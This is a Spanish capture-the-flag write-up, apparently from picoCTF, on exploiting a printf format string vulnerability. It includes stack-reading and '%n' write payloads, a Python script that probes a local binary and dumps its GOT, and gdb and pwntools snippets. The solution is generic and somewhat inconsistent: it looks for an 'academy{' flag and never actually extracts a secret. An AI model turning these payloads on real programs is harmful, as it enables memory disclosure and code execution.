# Reverse Engineering — Format Strings

## Descripción

> **Prompt oficial del reto:** "Find the secret using format string vulnerabilities."

- **Categoría:** Reverse Engineering / Explotación
- **Dificultad:** Hard
- **Evento/origen:** picoCTF
- **Puntos:** 160

## Solución

El reto suministra un binario que contiene una vulnerabilidad de format string (formato de cadena).

### 1. Conceptos de Format String

Una vulnerabilidad de format string ocurre cuando:
- Entrada del usuario se usa directamente como formato en `printf`, `sprintf`, etc.
- Sin validación de especificadores de formato (`%x`, `%s`, `%n`)

```c
// VULNERABLE
printf(user_input);  // Si user_input = "%x%x%x", se leen valores de la pila

// SEGURO
printf("%s", user_input);
```

### 2. Análisis del binario

Al usar objdump o Ghidra:

1. **Localizar la función vulnerable:**
   ```bash
   objdump -d binary | grep printf
   ```

2. **Identificar patrones:**
   - Lectura de entrada sin sanitizar
   - Uso directo como formato en printf/sprintf

3. **Calcular offsets:**
   - Determinar cuántos campos hay en la pila antes de alcanzar datos controlados

### 3. Técnicas de explotación

**Lectura de memoria (información disclosure):**
```bash
# Leer valores de la pila
./binary "%x%x%x%x"

# Leer string en dirección específica
./binary "%s" "$(python3 -c 'print("\xad\xde\xad\xbe")')"
```

**Escritura en memoria (RCE potencial):**
```bash
# Usar %n para escribir en dirección de memoria
./binary "%08x.%x.%x.%x.%n"
```

### 4. Script de resolución

```python
#!/usr/bin/env python3
import subprocess
import struct

def solve_format_strings():
    """
    Explota vulnerabilidad de format string para encontrar la flag
    """
    
    # Estrategia 1: Leer memoria con %x
    print("[*] Intentando leer memoria...")
    
    payloads = [
        "%x" * 10,           # Leer 10 valores de pila
        "%p" * 10,           # Leer puntos con formato de puntero
        "%s" * 5,            # Intentar leer strings
    ]
    
    for payload in payloads:
        try:
            result = subprocess.run(
                ["./format_strings_binary"],
                input=payload,
                capture_output=True,
                text=True,
                timeout=2
            )
            
            print(f"[*] Payload: {payload}")
            print(f"[*] Output: {result.stdout[:200]}")
            
            if "academy{" in result.stdout:
                print(f"[+] FLAG ENCONTRADA!")
                return result.stdout
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Estrategia 2: Análisis de GOT (Global Offset Table)
    print("\n[*] Analizando GOT...")
    
    # Extraer GOT con objdump
    result = subprocess.run(
        ["objdump", "-R", "./format_strings_binary"],
        capture_output=True,
        text=True
    )
    
    print("[*] Relocaciones:")
    print(result.stdout[:500])

if __name__ == "__main__":
    solve_format_strings()
```

### 5. Herramientas útiles

```bash
# Analizar formato de cadena
gdb ./binary
(gdb) break printf
(gdb) run
(gdb) info registers  # Ver contenido de pila

# Usar pwntools para automatizar
from pwn import *
r = process('./binary')
r.sendline('%x%x%x%x')
print(r.recvall())
```

## Notas adicionales

- Format strings son vulnerabilidades clásicas en binarios antiguos
- Requieren comprensión del layout de memoria y convenciones de llamada
- La posición del offset es crucial para éxito
- Usar scripts de python/pwntools acelera el proceso exponencialmente

## Referencias

- Herramientas: gdb, objdump, pwntools, printf-format-string-visualizer
- Técnicas: Format string exploitation, memory reading, GOT hijacking
- Documentación: man printf (especificadores de formato)
